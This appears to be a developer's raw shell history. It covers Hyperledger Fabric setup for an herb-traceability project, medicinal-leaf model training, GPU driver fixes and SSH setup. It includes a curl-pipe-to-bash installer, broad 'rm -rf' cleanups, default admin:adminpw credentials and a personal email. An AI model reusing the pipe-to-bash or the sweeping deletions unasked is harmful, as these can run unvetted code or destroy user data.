sudo cp -r ../ehr-testing/ .
cp -r ../ehr-testing/ .
cp -r ../ehr-testing/
git commit --allow-empty -m "nothing to see here"

git rm -rf .

git checkout --orphan blockchain

mv Snack_Overflow/ ../
rm LICENSE
rm README.md
tree .
cd ayurvedic-network/
cd sih/hyperledger/
node onboardCollector.js
rm -r wallet/Collector-sanju1.id
rm wallet/Collector-sanju04.id
node onboardCollectorarg.js sanju
node query.js
cat query.js
cp -r cert-script/wallet/ .
curl --location --request POST 'http://localhost:5000/onboardHerbbatch' \
--header 'Content-Type: application/json' \
--data '{
    "userId": "Cooperative01",
    "herbbatchId": "HB-005",
    "name": "Jane Doe",
    "dob": "1991-05-15",
    "city": "Mumbai"
}'
node onboardLabAgent.js
cd sih/hyperledger/ehr-testing/fabric-samples/test-network/
node registerOrg2Admin.js
mkdir ../wallet
mkdir wallet/
cd ../../server-node-sdk/cert-script/
cd ../../ehr-testing/fabric-samples/test-network/
cd ../../fabric-samples/test-network/
node cert-script/callChaincode.js
curl --location --request POST 'http://localhost:5000/onboardHerbbatch' \
--header 'Content-Type: application/json' \
--data '{
    "userId": "Cooperative01",
    "herbbatchId": "HB-103",
    "name": "Alex Smith",
    "dob": "1995-10-26",
    "city": "Mumbai"
}'
curl --location --request POST 'http://localhost:5000/onboardHerbbatch' \
--header 'Content-Type: application/json' \
--data '{
    "userId": "Cooperative01",
    "herbbatchId": "HB-003",
    "name": "Alex Smith",
    "dob": "1995-10-26",
    "city": "Mumbai"
}'
curl --location --request POST 'http://localhost:5000/onboardHerbbatch' \
--header 'Content-Type: application/json' \
--data '{
    "userId": "Cooperative01",
    "herbbatchId": "HB-002",
    "name": "Jane Doe",
    "dob": "1991-05-15",
    "city": "Mumbai"
}'
curl --location --request POST 'http://localhost:5000/onboardHerbbatch' \
--header 'Content-Type: application/json' \
--data '{
    "userId": "Cooperative01",
    "herbbatchId": "HB-001",
    "name": "Alex Smith",
    "dob": "1995-10-26",
    "city": "Mumbai"
}'
curl --location --request POST 'http://localhost:5000/api/onboardHerbbatch' \
--header 'Content-Type: application/json' \
--data '{
    "herbbatchId": "HB-001",
    "name": "Alex Smith",
    "dob": "1995-10-26",
    "city": "Mumbai"
}'
curl --location --request POST 'http://localhost:4000/api/onboardHerbbatch' \
--header 'Content-Type: application/json' \
--data '{
    "herbbatchId": "HB-001",
    "name": "Alex Smith",
    "dob": "1995-10-26",
    "city": "Mumbai"
}'
sudo pacman -S tree
cd app/
cd ~/Postman/Postman/
cp cert-script/wallet/ .
node onboardLabCompany.js
npm install fabric-ca-client fabric-network --save

node callChaincode.js
cd test-network
cd ehr-testing/fabric-samples/
cp -r  EHR-Hyperledger-Fabric-Project/ ehr-testing
mv EHR-Hyperledger-Fabric-Project/ ehr-fuckedup
rm -rf ehr-testing/
cd ~/sih
cd ../../../ehr-testing/
cp -r  ../../../../../EHR-Hyperledger-Fabric-Project/ ../../../../../ehr-testing
cp ../../../../../EHR-Hyperledger-Fabric-Project/ ../../../../../ehr-testing
cd asset-transfer-basic/chaincode-javascript/
cd fabric-samples/
cd ../../..//EHR-Hyperledger-Fabric-Project/
ls Medicinal-Plant-Identification/1/Indian\ Medicinal\ Leaves\ Image\ Datasets/Medicinal\ Leaf\ dataset/ -l
python model.py awdawd.jpeg
python model.py WhatsApp\ Image\ 2025-09-15\ at\ 3.13.07\ PM.jpeg
python model.py coreandera4.jpg
python model.py coreander.jpg
python model.py coreander
python model.py brami.jpg
python model.py 1000_F_392178113_o1YiWixVI50lIYlq2Nrth4kOYA35r1VV.jpg
python model.py c0026141-800px-wm.jpg
python model.py castrer.jpg
python model.py istockphoto-486714852-612x612.jpg
python model.py awdawdad.jpg
python model.py 28999685-green-papaya-leaf-isolated.jpg
mv 28999685-green-papaya-leaf-isolated.jpg  awdawdad.jpg
python model.py istockphoto-1319910704-612x612.jpg
python model.py tulsi-plant.jpg
python model.py tulsi-leaves-t-cut-500x500.jpg
python model.py istockphoto-513447755-612x612.jpg
python model.py medicinal-holy-basil-tulsi-leaves-white_525574-12844.avif
python model.py Screenshot\ 2025-09-15\ at\ 14-51-47\ Here\ Are\ 7\ Tips\ To\ Use\ Tulsi\ Leaves\ On\ An\ Empty\ Stomach\ OnlyMyHealth.png
python model.py  Medicinal-Plant-Identification/1/Indian\ Medicinal\ Leaves\ Image\ Datasets/Medicinal\ Leaf\ dataset/Amruthaballi/484.jpg
python model.py  Medicinal-Plant-Identification/1/Indian\ Medicinal\ Leaves\ Image\ Datasets/Medicinal\ Leaf\ dataset/Amruthaballi/485.jpg
python model.py  Medicinal-Plant-Identification/1/Indian\ Medicinal\ Leaves\ Image\ Datasets/Medicinal\ Leaf\ dataset/Amruthaballi/10.jpg
python model.py  Medicinal-Plant-Identification/1/Indian\ Medicinal\ Leaves\ Image\ Datasets/Medicinal\ Leaf\ dataset/Amruthaballi/2.jpg
python model.py  Medicinal-Plant-Identification/1/Indian\ Medicinal\ Leaves\ Image\ Datasets/Medicinal\ Leaf\ dataset/Amruthaballi/25.jpg
python model.py  Medicinal-Plant-Identification/1/Indian\ Medicinal\ Leaves\ Image\ Datasets/Medicinal\ Leaf\ dataset/Aloevera/8.jpg
ls Medicinal-Plant-Identification/1/Indian\ Medicinal\ Leaves\ Image\ Datasets/Medicinal\ Leaf\ dataset/Aloevera/8.jpg
ls /Medicinal-Plant-Identification/1/Indian\Medicinal\Leaves\Image\Datasets/Medicinal\Leaf\dataset/Aloevera
ls /home/bb/sih/ml/Medicinal-Plant-Identification/1/Indian\Medicinal\Leaves\Image\Datasets/Medicinal\Leaf\dataset/Aloevera
ls /home/bb/sih/ml/Medicinal-Plant-Identification/1/Indian\Medicinal\Leaves\ImageDatasets/Medicinal\Leaf\dataset/Aloevera
ls /home/bb/sih/ml/Medicinal-Plant-Identification/1/Indian\Medicinal\Leaves\ImageDatasets/Medicinal Leaf dataset/Aloevera
ls /home/bb/sih/ml/Medicinal-Plant-Identification/1/Indian Medicinal Leaves Image Datasets/Medicinal Leaf dataset/Aloevera
cd ../../../../../
cd Aloevera/
cd Medicinal-Plant-Identification/1/Indian\ Medicinal\ Leaves\ Image\ Datasets/Medicinal\ Leaf\ dataset/
python -c "import tensorflow as tf; print(tf.__version__)"

python
python model.py
mv ~/Documents/model.py .
cd ../../../
conda activate herb_ml
conda activate herb_ml base
feh 100.jpg
cd Medicinal\ Leaf\ dataset/
cd Indian\ Medicinal\ Leaves\ Image\ Datasets/
cd 1/
cd Medicinal-Plant-Identification
cat Medicinal-Plant-Identification/README.md
cat  herb_image_compress/95_name.txt
node nodejs_pdf_extractor.js  Maha-Swarna-Brahma-Yog.pdf
node nodejs_pdf_extractor.js  Drakshovin-Special.pdf
npm install pdf-parse
cd ~/Documents/
pip install tensorflow keras numpy pillow

ls Medicinal-Plant-Identification/
mv ~/Downloads/vgg16_medicinal_leaves.h5  .
ls Medicinal-Plant-Identification/1/ -l
ls Medicinal-Plant-Identification/1/Indian\ Medicinal\ Leaves\ Image\ Datasets/Medicinal\ Leaf\ dataset/
ls Medicinal-Plant-Identification/1/Indian\ Medicinal\ Leaves\ Image\ Datasets/Medicinal\ 
ls herb_image_compress/
cd sih/ml/
cd ~/
./network.sh install
sudo pacman -S python-openid
# Run this ONLY if the command above failed
sudo pacman -Ss python2
# Run this ONLY if the command above failed
sudo pacman -S python2
yay -S python2
npm config set python python2
python2 --version
cd sih/hyperledger/fabric-samples/hlf1.4-supply-chain/
node -v
fisher install edc/bass
sudo pacman -S fisher
zsh
nvm
sudo pacman -S nvm
# Install a late release of Node.js v8
nvm install 8.17.0

# Switch your terminal session to use this version
nvm use 8.17.0
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash
nvim network.sh
./network.sh start
cd hlf1.4-supply-chain/
mv hlf1.4-supply-chain/ fabric-samples/
cp -r  Snack_Overflow/fabric-samples/ .
cp Snack_Overflow/fabric-samples/ .
git clone https://github.com/ialberquilla/hlf1.4-supply-chain.git
cp  -r cert-script/wallet/ .
cd ~/sih/hyperledger/EHR-Hyperledger-Fabric-Project/server-node-sdk/cert-script/
chmod +x postman
cd Postman/
tar -xvzf postman-linux-x64.tar.gz
cd erhjaaa/
cd sih/blockchian/
ls -l -a
ls -l
ls -l .
cd files/
cd ~
cd ~/Downloads/
node onboardInsuranceAgent.js
node onboardDoctor.js
node onboardInsuranceCompany.js
node onboardHospital01.js
rm Doctor-Rama04.id  Hospital01.id  hospitalAdmin.id insuranceAdmin.id  insuranceAgent-Rama.id  insuranceCompany01.id
node install
mv EHR-Hyperledger-Fabric-Project/ erhjaaa
cd fabric-samples-dev/test-network/
CD ..
ls -l -a -r
pwd ../
node onboard-cooperative-working.js
node find-connection-profile.js
node onboard-collector\(1\).js
./network.sh deployCC -ccn basic -ccp ../asset-transfer-basic/chaincode-javascript/ -ccl javascript
nvim config.yaml
cd organizations/peerOrganizations/org1.example.com/msp/
cd test-application/
cd ~/sih/hyperledger/Snack_Overflow/fabric-samples-dev/asset-transfer-basic/chaincode-javascript/
mv EHR-Hyperledger-Fabric-Project/server-node-sdk/ ~/sih/hyperledger/Snack_Overflow/
mv EHR-Hyperledger-Fabric-Project/server-node-sdk/cert-script/ ~/sih/hyperledger/Snack_Overflow/
cd /tmp/
ls organizations/
cd ../../../../../Snack_Overflow/fabric-samples-dev/asset-transfer-basic/chaincode-javascript/
mv assetTransfer.js  ../asset-transfer-basic/chaincode-javascript/lib/
mv ../asset-transfer-basic/chaincode-javascript/lib/HerbChainCode.js assetTransfer.js
docker logs baa21a0c5067

docker ps -a | egrep "HerbChainCode|herb|dev-peer"

source ~/.bashrc
export FABRIC_CFG_PATH=$PWD/../config/
export PATH={$PWD}/../bin:$PATH
cd sih/hyperledger/Snack_Overflow/fabric-samples-dev/test-network/
./network.sh deployCC -ccn HerbChainCode -ccp ../asset-transfer-basic/chaincode-javascript/ -ccl javascript
ls lib
mv lib/assetTransfer.js  .
cd li
cd ../../../Snack_Overflow/fabric-samples-dev/asset-transfer-basic/chaincode-javascript/
cd fabric-samples-dev/
mv chaincode.js HerbChainCode.js
cd asset-transfer-basic/chaincode-javascript/lib/
nvim assetTransfer.js
emacs
cp -r  ../../fabric-samples/ ../../fabric-samples-dev/
:q
ls  ../asset-transfer-basic/chaincode-javascript/lib/
nvim ../asset-transfer-basic/chaincode-javascript/lib/assetTransfer.js
docker stop logspout
docker rm logspout
export CC_PACKAGE_ID=basic_1.0:f2689552141ee3d222d783b8dd96bc1f64e92e09322020d95d75d8c3aca35265
peer lifecycle chaincode queryinstalled
peer lifecycle chaincode install basic.tar.gz
cd ../../../test-network/
cd ../../chaincode-javascript/lib/
nvim assetTransfer.ts
cd src/
cd chaincode-typescript/
cd chaincode-javascript/
cd ../asset-transfer-basic/chaincode-typescript/src/
nvim ../asset-transfer-basic/application-gateway-typescript/package.json
peer lifecycle chaincode package basic.tar.gz --path ../asset-transfer-basic/chaincode-javascript/ --lang node --label basic_1.0
export PATH+{$pwd}/../bin:$PATH
./network.sh up createChannel
cd fabric-samples/asset-transfer-basic/
cd ../../../hyperledger/Snack_Overflow/
ls builders/
ls bin/
peer version
peer
sudo pacman -Ss peer
sudo pacman -S peer
nvim ../config/core.yaml
ls ../config/
nvim lib/assetTransfer.js
cat lib/assetTransfer.js
cd ...
./monitordocker.sh fabric_test
nvim monitordocker.sh
docker os
microsoft-edge-stable --version

sudo pacman -S speech-dispatcher

microsoft-edge-stable
yay -S microsoft-edge-stable-bin

yay -S edge
sudo pacman -S edge
nvim app.ts
cd application-gateway-typescript/
dunst &

sudo pacman -S dunst   # lightweight notification daemon

systemctl --user status xdg-desktop-portal.service

systemctl --user restart xdg-desktop-portal.service
systemctl --user restart xdg-desktop-portal-gtk.service

sudo cp /home/bb/sih/hyperledger/Snack_Overflow/fabric-samples/test-network/organizations/peerOrganizations/org1.example.com/connection-org1.json /home/bb/sih/hyperledger/Snack_Overflow/organizations/peerOrganizations/farmers.ayurvedic.com/connection-farmers.json
sudo pacman -S libnotify
sudo pacman -S libva-intel-driver
sudo pacman -S xdg-desktop-portal xdg-desktop-portal-gtk
curl http://localhost:3000
chmod +x Cursor-1.5.11-x86_64.AppImage
rm Cursor-1.3.8-x86_64.AppImage.zs-old
chmod +x Cursor-1.3.8-x86_64.AppImage.zs-old Cursor-1.5.11-x86_64.AppImage
rm ./Cursor-1.3.8-x86_64.AppImage
node server.js
cd api/
cd  sih/hyperledger/Snack_Overflow/
./network.sh deployCC -ccn ayurcode -ccp ../../chaincode/ayurvedic-traceability/lib/ -ccl javascript
sudo cat /root/.npm/_logs/2025-09-13T13_11_03_601Z-debug-0.log
cat /root/.npm/_logs/2025-09-13T13_11_03_601Z-debug-0.log
cp ../../chaincode/ayurvedic-traceability/lib/ayurvedic-contract.js ../asset-transfer-abac/
cp ../../chaincode/ayurvedic-traceability/
./network.sh deployCC -ccn ayurcode -ccp ../../chaincode/ayurvedic-traceability/lib/ayurvedic-contract.js -ccl javascript
./network.sh up createChannel -ca
./deploy.sh
ls system-genesis-block/
./scripts/deployCC.sh
rm network.sh
rm utils.sh
rm network.config
cp fabric-samples/test-network/scripts/utils.sh .
nvim network.config
cp fabric-samples/test-network/network.config  .
docker kill $(docker ps -q)

docker compose down
node wallet-enroll.js
./start-blockchain.sh
./quick-production-setup.sh
python script_1.py
python script.py
cat script_1.py
cd blockchain/
cd certificates/
cat start-blockchain.sh
cd scripts/
cd network/
cd scripts/ipfs/
cd chaincode/
./network.sh up createChannel -c mychannel

./scripts/network/
./complete-production-setup.sh
docker prune
docker down
cat fabric-samples/test-network/CHAINCODE_AS_A_SERVICE_TUTORIAL.md
cp fabric-samples/test-network/network.sh .
cd chaincode/ayurvedic-traceability/lib/
./deploy-ayurvedic-blockchain.sh
chmod +x deploy.sh
nvim deploy.sh
docker compose up -d
cat chaincode/ayurvedic-traceability/lib/ayurvedic-contract.js
cat fabric-samples/off_chain_data/README.md
cat fabric-samples/CODEOWNERS access-control/rbac.js
cat fabric-samples/CODEOWNERS access-control/
cat fabric-samples/asset-transfer-basic/README.md
cat fabric-samples/asset-transfer-basic/
cat fabric-samples/MAINTAINERS.md
ls fabric-samples/test-network/
df -h

nvim deploy-ayurvedic-blockchain.sh
nvim readme.md
./Cursor-1.3.8-x86_64.AppImage
cat readme.md
git branch origin/Hemang
sudo rm -rf EHR-Hyperledger-Fabric-ProjectOG/
rm -rf EHR-Hyperledger-Fabric-ProjectOG/
sudo envycontrol -s hybrid
envycontrol -q
ls /home/bb/sih/hyperledger/EHR-Hyperledger-Fabric-Project/server-node-sdk/wallet

./app.js
npm run
npm run  build
cd EHR-Hyperledger-Fabric-Project
mv EHR-Hyperledger-Fabric-Project/ EHR-Hyperledger-Fabric-ProjectOG/
openssl x509 -in <path-to-cert.pem> -text -noout

cat wallet/admin.id
cp -r cert-script/wallet/
mv  wallet/ ../
mv -r wallet/ ../
cdd ..
node registerAdminlab.js
rm -rf wallet/admin.id

docker logs ca_org1

ls wallet/admin.id

fabric-ca-client identity list -u http://admin:adminpw@localhost:7054

npm install fabric-ca-client fabric-network

cat registerOrg1Admin.js
rm -rf wallet/adminlab.id
node registerAdminlab.js

node registerAdminlab.js

rm insuranceAgent-Rama.id
rm Doctor-Rama04.id
cd sih/hyperledger/EHR-Hyperledger-Fabric-Project/Postman/app/
cd ao
rm -r Postman/
tar -xvf postman-linux-x64.tar.gz
mv ~/Downloads/postman-linux-x64.tar.gz .
atac -h
sudo pacman -S atac
sudo pacman -Ss postman
sudo pacman -S postman
mv wallet/insuranceAgent-Rama.id .
mv wallet/insuranceAdmin.id .
rm insuranceCompany01.id
cat wallet/adminlab.id
cd ca/
nvim connection-org1.json
nvim registerAdminlab.js
cd org1.example.com/
nvim org1.example.com
nvim org1.example.com/
cd fabric-samples/test-network/organizations/peerOrganizations/
cp ../../backup/registerAdminlab.js .
./network.sh up createChannel -ca -s couchdb

docker volume prune -f
docker network prune -f

docker rm couchdb1 couchdb0 couchdb2 peer0.org1.imagechain.com peer0.org2.imagechain.com peer1.org1.imagechain.com orderer.imagechain.com

docker container rm -v 1db1ec6263102462695799b900e147f751d66f7927b1d2b0b48f126df0095723
docker container rm -v [container_name_or_id]
docker ps -a
docker stop -a
watch -n 5 'echo "Power: $(echo "scale=2; $(cat /sys/class/power_supply/BAT0/power_now) / 1000000" | bc)W | CPU: $(grep "cpu " /proc/stat | awk "{print int((\$2+\$4)*100/(\$2+\$3+\$4+\$5))}%")"'

node registerAdmin.js
node registerUser.js
cd backup/
./network.sh up createChannel -ca

blueman-manager
npm -v
nvm install 18
nvm use 18

curl -k https://localhost:7054/cainfo

curl http://localhost:7054/cainfo

./network.sh
docker ps --format "table {{.Names}}\t{{.Status}}"

wallet/
ls node_modules | grep fabric

./network.sh up
cdd EHR-Hyperledger-Fabric-Project/
.ls
cd ../..
cd test/
cd asset-transfer-basic/
docker stop $(docker ps -q)

docker  ps
jq   --help
jq -v
sudo pacman -S jq
sudo pacman -S nodejs
sudo pacman -S node
sudo pamcan -S node
git clone git@github.com:akshaykurhekar/EHR-Hyperledger-Fabric-Project.git
mkdir hyperledger
sudo pacman -Rns $(pacman -Qtdq)
sudo paccache -r

htop
brightnessctl set 0%
nvidia-smi 2>/dev/null || echo "No NVIDIA GPU or nvidia-smi not installed"
cat /sys/class/drm/card*/device/power_state 2>/dev/null || echo "No discrete GPU or not accessible"
sudo auto-cpufreq --stats
# Basic power information
cat /sys/class/power_supply/BAT0/power_now     # Current power draw in µW
cat /sys/class/power_supply/BAT0/energy_now    # Current energy level in µWh
cat /sys/class/power_supply/BAT0/voltage_now   # Current voltage in µV

# Calculate power in watts
echo "scale=2; $(cat /sys/class/power_supply/BAT0/power_now) / 1000000" | bc

cat /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor
# Check current refresh rate
xrandr | grep "*"

ps aux --sort=-%cpu | head -10
sudo powertop

# Install ACPI utilities
sudo pacman -S acpi

# Show battery status and power information
acpi -b
acpi -V  # Verbose output with more details

cat /sys/class/power_supply/ADP0/power/control
cat /sys/class/power_supply/ADP0/power/runtime_status
cat /sys/class/power_supply/ADP0/power/
cat /sys/class/power_supply/BAT0/power_now
# Install powertop
sudo pacman -S powertop

# Run calibration (optional, causes temporary high CPU usage)
sudo powertop --calibrate

# Launch interactive power monitor
sudo powertop

upower -i /org/freedesktop/UPower/devices/battery_BAT0
sudo pacman -S upower
sudo envycontrol -s integrated
envycontrol -v
envycontrol -d
envycontrol -dm
envycontrol -s
envycontrol -h
envycontrol
sudo pacman -S bbswitch
sudo pacman -Ss optimus
docker stop --help
cd application/backend/wallet/
ls application/backend/wallet/
rm -rf application/backend/wallet
cp -r  wallet  application/backend/
docker ps --format 'table {{.Names}}\t{{.Image}}\t{{.Ports}}' | grep fabric-ca

sudo pacman -S hyperledger
sudo pacman -Ss hyperledger
sudo pacman -Ss fabric
sudo pacman -Ss fabric-ca
sudo pacman -S fabric
# Test blockchain connectivity
docker exec cli peer channel list
docker exec cli peer lifecycle chaincode queryinstalled

# Test IPFS cluster
curl http://localhost:5001/api/v0/id
curl http://localhost:5002/api/v0/id  
curl http://localhost:5003/api/v0/id

# Check all databases
curl -u admin:adminpw http://localhost:5984/
curl -u admin:adminpw http://localhost:6984/
curl -u admin:adminpw http://localhost:7984/

# Step 1: Stop all Fabric containers
docker-compose -f docker-compose-fabric.yml down -v

# Step 2: Create complete MSP directory structure
mkdir -p blockchain/crypto-config/{ordererOrganizations/imagechain.com/{ca,msp/{admincerts,cacerts,keystore,signcerts,tlscacerts},orderers/orderer.imagechain.com/{msp/{admincerts,cacerts,keystore,signcerts,tlscacerts},tls}},peerOrganizations/{org1.imagechain.com/{ca,msp/{admincerts,cacerts,keystore,signcerts,tlscacerts},peers/{peer0.org1.imagechain.com/{msp/{admincerts,cacerts,keystore,signcerts,tlscacerts},tls},peer1.org1.imagechain.com/{msp/{admincerts,cacerts,keystore,signcerts,tlscacerts},tls}},users/Admin@org1.imagechain.com/{msp/{admincerts,cacerts,keystore,signcerts,tlscacerts},tls}},org2.imagechain.com/{ca,msp/{admincerts,cacerts,keystore,signcerts,tlscacerts},peers/peer0.org2.imagechain.com/{msp/{admincerts,cacerts,keystore,signcerts,tlscacerts},tls},users/Admin@org2.imagechain.com/{msp/{admincerts,cacerts,keystore,signcerts,tlscacerts},tls}}}}

# Step 3: Generate development certificates
openssl genrsa -out blockchain/crypto-config/ordererOrganizations/imagechain.com/ca/ca.key 4096
openssl req -new -x509 -key blockchain/crypto-config/ordererOrganizations/imagechain.com/ca/ca.key -sha256 -subj "/C=US/ST=CA/O=ImageChain/CN=ca.orderer.imagechain.com" -days 3650 -out blockchain/crypto-config/ordererOrganizations/imagechain.com/ca/ca.crt

# Step 4: Copy CA certificates to all MSP directories
find blockchain/crypto-config -name cacerts -exec cp blockchain/crypto-config/ordererOrganizations/imagechain.com/ca/ca.crt {}/ca.crt \;
find blockchain/crypto-config -name tlscacerts -exec cp blockchain/crypto-config/ordererOrganizations/imagechain.com/ca/ca.crt {}/tlsca.crt \;

# Step 5: Generate admin certificates for all entities
openssl genrsa -out blockchain/crypto-config/ordererOrganizations/imagechain.com/msp/keystore/admin.key 4096
openssl req -new -key blockchain/crypto-config/ordererOrganizations/imagechain.com/msp/keystore/admin.key -subj "/C=US/ST=CA/O=ImageChain/CN=admin.orderer" -out admin.csr
openssl x509 -req -in admin.csr -CA blockchain/crypto-config/ordererOrganizations/imagechain.com/ca/ca.crt -CAkey blockchain/crypto-config/ordererOrganizations/imagechain.com/ca/ca.key -CAcreateserial -out admin.crt -days 365 -sha256

# Copy admin certificates to all admin directories
find blockchain/crypto-config -name admincerts -exec cp admin.crt {}/admin.crt \;
find blockchain/crypto-config -name signcerts -exec cp admin.crt {}/admin.crt \;
find blockchain/crypto-config -path "*/keystore" -exec cp blockchain/crypto-config/ordererOrganizations/imagechain.com/msp/keystore/admin.key {}/admin.key \;

# Cleanup
rm admin.csr admin.crt

# Test IPFS API endpoints
curl -X POST http://localhost:5001/api/v0/id
curl -X POST http://localhost:5002/api/v0/id  
curl -X POST http://localhost:5003/api/v0/id

# Check IPFS web UI (these should work now)
echo "🌐 Try these URLs:"
echo "   • http://localhost:8080/webui"
echo "   • http://localhost:8081/webui"
echo "   • http://localhost:8082/webui"

docker-compose -f docker-compose-ipfs.yml down
cd home/bb/sih/blockchian/
cd //
1
curl http://localhost:8880
curl http://localhost:800
curl http://localhost:8080
curl http://localhost:80800
docker logs ipfs0
docker logs e06d923f8ffc
docker logs
docker stop 06f600639ea1
chmod +x quick-production-setup.sh
mv ~/Downloads/quick-production-setup.sh  .
chmod +x complete-production-setup.sh
cat complete-production-setup.sh
mv ~/Downloads/complete-production-setup.sh  .
mv package-json.json package.json

cat script.py
unzip exported-assets.zip
mv ../exported-assets.zip  .
rm -r testing/
mkdir blockchian testing
mv ../Downloads/exported-assets.zip .
cd home/bb/
cd /
sudo pacman -Syu
sudo pacman -S libva libva-intel-driver

ls Aloevera/
cd 1/Indian\ Medicinal\ Leaves\ Image\ Datasets/Medicinal\ plant\ dataset/
cd 1/Indian\ Medicinal\ Leaves\ Image\ Datasets/Medicinal\ plant\ dataset/Aloevera/
ls 1/
cp -r /home/bb/.cache/kagglehub/datasets/aryashah2k/indian-medicinal-leaves-dataset/versions/1 .
cp /home/bb/.cache/kagglehub/datasets/aryashah2k/indian-medicinal-leaves-dataset/versions/1 .
conda install kagglehub
python -m ipykernel install --user --name tf_gpu_env --display-name "Python (tf_gpu_env)"

conda install ipykernel

python -c "
import tensorflow as tf
print('TensorFlow version:', tf.__version__)
print('GPUs available:', tf.config.list_physical_devices('GPU'))
if tf.config.list_physical_devices('GPU'):
    print('GPU memory growth enabled')
    for gpu in tf.config.list_physical_devices('GPU'):
        tf.config.experimental.set_memory_growth(gpu, True)
"

jupyter  notebook
pip install keras opencv-python matplotlib numpy

git clone https://github.com/kausik-t/Medicinal-Plant-Identification.git
cd Medicinal-Plant-Identification

conda create -n tf_gpu_env python=3.9
conda activate tf_gpu_env
conda install -c conda-forge cudatoolkit=11.8 cudnn
pip install tensorflow

conda install cudatoolkit=11.8 cudnn tensorflow-gpu

pip install tensorflow

sudo rm -rf past-donwload-dump/
rm -rf past-donwload-dump/
past-donwload-dump/
rm -rf pbctf/
sudo du -ahx / | sort -rh | head -20

sudo rm -rf /tmp/*

sudo paccache -r -k 0

conda clean -a

conda env list

conda info
conda env remove  -n base
conda deactivate

conda env remove -n base

pip cache purge

conda deactivate
pip cache info

rm -rf /tmp/*
rm -rf ~/.cache/*

sudo journalctl --vacuum-time=2weeks

sudo paccache -r

sudo pacman -Rns $(pacman -Qtdq)

pip install tensorflow --timeout 100

pip uninstall tensorflow tensorflow-gpu -y

CLEAR
nvidia-smi

pip install tensorflow --upgrade

python -c "import tensorflow as tf; print(tf.config.list_physical_devices('GPU'))"

pip install googleapis-common-protos==1.56.2

pip show protobuf

pip install protobuf==3.19.6

pip install tensorflow_datasets
conda install tensorflow_datasets
pip config set global.index-url https://pypi.org/simple

pip install jupyter notebook

conda install jupyter notebook

jupyter notebook

python -m ipykernel install --user --name herb_ml --display-name "Python (herb_ml)"

pip install --upgrade pip

pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple

pip install tensorflow
pip install matplotlib numpy pandas scikit-learn seaborn opencv-python prettytable

cd herb_image_compress/
uname -r
lsmod | grep nvidia
nvidia-smi

sudo reboot
sudo pacman -S nvidia-dkms --overwrite '*'

sudo pacman -S nvidia-dkms --force

nvidia-smi
sudo pacman -S nvidia-dkms
sudo dkms install nvidia/$(pacman -Q nvidia-dkms | cut -d' ' -f2)

sudo mkinitcpio -P

sudo pacman -S linux-lts-headers

uname -a

pacman -Qs linux

find /lib/modules/$(uname -r) -name 'nvidia*.ko*'

dpkg -l | grep nvidia

sudo pacman -S dpkg
lsmod | grep nvidia

sudo envycontrol -s nvidia

pacman -Qs envycontrol

sudo modprobe -r bbswitch

systemctl list-unit-files | grep nvidia
lsmod | grep bbswitch

pacman -Qs optimus-manager

optimus-manager --status

sudo modprobe nvidia

sudo pacman -S nvidia nvidia-utils cuda cudnn

python3 setup.py build develop
python -m ipykernel install --user --name=herb_ml --display-name "Python (myenv)"

pip install matplotlib numpy pillow tensorflow tensorflow-datasets

cat error.txt
python3 setup.py build develop 2>error.txt
python3 setup.py build develop2>error.txt
python3 setup.py build develop 3> error.txt
conda create -n herb_ml python=3.7
conda activate herb_ml
conda install pytorch=1.4 torchvision cudatoolkit=9.0 -c pytorch
pip install yacs matplotlib

conda

conda config --set auto_activate_base false
chmod +x Miniconda3-latest-Linux-x86_64.sh
./Miniconda3-latest-Linux-x86_64.sh

wget https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh

conda init fish

yay -S conda
sudo pacman -S miniconda

sudo pacman -S conda
sudo pacman -S ninja
sudo pacman -S ninja-build
python -c "import torch; print(torch.__version__)"

python3 setup.py build develop > error.txt
python3 setup.py build develop

source ml/bin/activate.fish
source herb_image_compress/ml/bin/activate.fish
pip install tensorflow
pip install matplotlib
pip install pandas numpy
jupyter lab

source ../sih/ml/herb_image_compress/ml/bin/activate.fish
pip install jupyterlab

pip install notebook
pip install torch
python -m venv ml
python3 gen_med_db/gen_db.py
cat 95_name.txt
cd 10/
cd images/
tar -xmf images.tar
mv ~/Downloads/images.tar  .
mv ~/Downloads/category_name.txt .
cd data
mkdir data
git clone git@github.com:bucmsunxin/herb_image_compress.git
cd ml
mkdir ml
cd  sih/
ls medicinal_leaf_resnet18.pth
cmp output_seed_12345.png  output_seed_source.png
feh output_seed_source.png
feh output_seed_12345.png
./nob 12345
mv output_seed_12345.png  output_seed_source.png
feh output.png
./nob
gcc -o nob nob.c
cd sih/hash-vizualisation/
nvim nob.c
mv testhash.c  hash-vizualisation/
nvim testhash.c
cd sih
wget https://raw.githubusercontent.com/h5p9sl/hmac_sha256/refs/heads/master/sha256.c
wget https://raw.githubusercontent.com/h5p9sl/hmac_sha256/refs/heads/master/sha256.h
git clone git@github.com:BhuvanB404/hash-vizualisation.git
cd projects/
mkdir sih
git push -u origin master
git remote add origin git@github.com:BhuvanB404/file-server.git
git commit -m "setting up"
cd projects/file-server/
ssh -T git@github.com

cat ~/.ssh/id_ed25519.pub

ssh-add ~/.ssh/id_ed25519

eval (ssh-agent -c)

eval "$(ssh-agent -s)"
ssh-add ~/.ssh/id_ed25519

ssh-keygen -t ed25519 -C "bhuvanb1408@gmail.com"

cat .ssh/known_hosts
ls ~/.ssh

./test_server
sudo pacman -S poco

vcpkg install poco

./vcpkg install poco

sudo pacman -S vcpkg
vcpkg
./test
eyantra-autoeval evaluate --year 2025 --theme CB --task 0

pip install psutil

nvim ../.bashrc
source ../.bashrc
./stm32cubeide
cd ../st/stm32cubeide_1.19.0/
./st-stm32cubeide_1.19.0_25607_20250703_0907_amd64.sh
chmod +x st-stm32cubeide_1.19.0_25607_20250703_0907_amd64.sh
unzip st-stm32cubeide_1.19.0_25607_20250703_0907_amd64.sh.zip
pip install -U eyantra-autoeval
source iitbhackathon/bin/activate.fish
python -m venv iitbhackathon
coppeliasim
cd ../Downloads/
nvim httplib.h
sudo pacman -S openssl

yay -S coppeliasim-bin

reb
vim test.txt
cola
echo maddam
echo ola
suii
sudo pacman -S terminator
sudo tlp-stat -s

yay -S auto-cpufreq
sudo systemctl enable --now auto-cpufreq.service

sudo nvim /etc/tlp.conf
nvim /etc/tlp.conf
sudo pacman -S tlp tlp-rdw
sudo systemctl enable --now tlp.service

emacs main.cpp
time g++ -O0 -g0 -o code main.cpp

time g++ -o code main.cpp

iostat -x 1 3

sudo pacman -S sysstat

sudo pacman -S iostat
g++ -o code main.cpp
